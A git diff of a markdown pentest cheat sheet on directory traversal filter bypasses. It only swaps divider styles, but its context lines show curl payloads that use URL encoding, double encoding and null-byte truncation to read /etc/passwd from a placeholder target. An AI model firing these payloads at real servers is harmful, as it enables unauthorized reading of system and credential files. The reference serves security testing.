@@ -16,7 +16,7 @@ linked:
 ---
 # Directory Traversal - Bypass de Sanitización
 
-***
+---
 
 ## URL Encoding Variants
 
@@ -38,7 +38,7 @@ linked:
 | `curl 'https://target/?file=..%2f../etc%2fpasswd'` | Mixed plain + encoded | Mixed bypass. |
 ^pt-bypass-encoding
 
-___
+---
 
 ## Null Byte Truncation
 
@@ -57,7 +57,7 @@ ___
 | `python3 -c "print('../'*5 + 'etc/passwd' + chr(0) + '.png')" \| xxd` | Verify NUL byte position | Verify. |
 ^pt-bypass-nullbyte
 
-___
+---
 
 ## Path Normalization Differences
 
@@ -79,7 +79,7 @@ ___
 | `curl 'https://target/?file=..%252f%252e%252e/etc/passwd'` | Double encode mixed | Multi-encode mixed. |
 ^pt-bypass-normalization
 
-___
+---
 
 ## Filter Strip Evasion
 
@@ -134,4 +134,4 @@ curl 'https://target/?file=../../../etc/passwd%00.png' | grep -m1 root:
 curl 'https://target/?file=....%2f....%2fetc%2fpasswd%00' | grep -m1 root:
 ```
 
-***
+---
